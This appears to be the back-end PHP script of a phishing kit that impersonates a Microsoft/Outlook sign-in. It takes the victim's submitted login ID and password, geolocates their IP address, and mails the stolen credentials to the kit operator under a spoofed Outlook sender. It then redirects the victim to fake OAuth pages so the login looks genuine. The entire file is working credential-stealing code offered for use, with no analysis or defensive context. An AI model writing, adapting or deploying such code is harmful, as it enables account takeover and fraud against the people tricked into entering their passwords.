<?php
error_reporting(0);

require "result.php";

function ip_info($ip = NULL, $purpose = "location", $deep_detect = TRUE) {
    $output = NULL;
    if (filter_var($ip, FILTER_VALIDATE_IP) === FALSE) {
        $ip = $_SERVER["REMOTE_ADDR"];
        if ($deep_detect) {
            if (filter_var(@$_SERVER['HTTP_X_FORWARDED_FOR'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_X_FORWARDED_FOR'];
            if (filter_var(@$_SERVER['HTTP_CLIENT_IP'], FILTER_VALIDATE_IP))
                $ip = $_SERVER['HTTP_CLIENT_IP'];
        }
    }
    $purpose    = str_replace(array("name", "\n", "\t", " ", "-", "_"), NULL, strtolower(trim($purpose)));
    $support    = array("country", "countrycode", "state", "region", "city", "location", "address");
    $continents = array(
        "AF" => "Africa",
        "AN" => "Antarctica",
        "AS" => "Asia",
        "EU" => "Europe",
        "OC" => "Australia (Oceania)",
        "NA" => "North America",
        "SA" => "South America"
    );
    if (filter_var($ip, FILTER_VALIDATE_IP) && in_array($purpose, $support)) {
        $ipdat = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=" . $ip));
        if (@strlen(trim($ipdat->geoplugin_countryCode)) == 2) {
            switch ($purpose) {
                case "location":
                    $output = array(
                        "city"           => @$ipdat->geoplugin_city,
                        "state"          => @$ipdat->geoplugin_regionName,
                        "country"        => @$ipdat->geoplugin_countryName,
                        "country_code"   => @$ipdat->geoplugin_countryCode,
                        "continent"      => @$continents[strtoupper($ipdat->geoplugin_continentCode)],
                        "continent_code" => @$ipdat->geoplugin_continentCode
                    );
                    break;
                case "address":
                    $address = array($ipdat->geoplugin_countryName);
                    if (@strlen($ipdat->geoplugin_regionName) >= 1)
                        $address[] = $ipdat->geoplugin_regionName;
                    if (@strlen($ipdat->geoplugin_city) >= 1)
                        $address[] = $ipdat->geoplugin_city;
                    $output = implode(", ", array_reverse($address));
                    break;
                case "city":
                    $output = @$ipdat->geoplugin_city;
                    break;
                case "state":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "region":
                    $output = @$ipdat->geoplugin_regionName;
                    break;
                case "country":
                    $output = @$ipdat->geoplugin_countryName;
                    break;
                case "countrycode":
                    $output = @$ipdat->geoplugin_countryCode;
                    break;
            }
        }
    }
    return $output;
}

if (isset($_SERVER['HTTP_CLIENT_IP'])) {
	$real_ip_adress = $_SERVER['HTTP_CLIENT_IP'];
}
if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
	$real_ip_adress = $_SERVER['HTTP_X_FORWARDED_FOR'];
}
else {
	$real_ip_adress = $_SERVER['REMOTE_ADDR'];
}

if ($_GET['mes1']){
	$email = $_GET['mes1'];
}

if ($_POST['kamu']){
	$email = $_POST['kamu'];
}

$cip = $real_ip_adress;
$address = ip_info("Visitor", "Address");
$main_country = ip_info("Visitor", "Country");
$hitung = $_POST['rahasia1'];

$mail = "You have got Micr0s0ft Update Drop\n";
$mail .= ".....\n";
$mail .= "Login ID : ".$_POST['kamu']."\n";
$mail .= "Passwd : ".$_POST['rahasia1']."\n";
$mail .= "Address : ".$cip."\n";
$mail .= "Location : ".$address."\n";
$mail .= "----------------------DesigManager Update----------------\n";
$sender = "From: Outlook <info@rumail.com";

$sub = "$cip | Micr0s0ft Alert - $main_country";

function random_number(){
	$numbers=array(0,1,2,3,4,5,6,7,8,9,'A','b','C','D','e','F','G','H','i','J','K','L');
	$key=array_rand($numbers);
	return $numbers[$key]; }

$url=random_number().random_number().random_number().random_number().random_number().random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));$url=random_number().random_number().random_number().random_number().random_number().random_number().date('U').md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U')).md5(date('U'));

$count = strlen ($hitung);
if ($count > 5) {
	mail($mail_to, $sub, $mail);
	header("Location: oauth20_authorize.srx.php?$url&mes1=$email");
} else {
	header("Location: oauth20_authorize.srf.php?$url&mes1=$email");
}

?>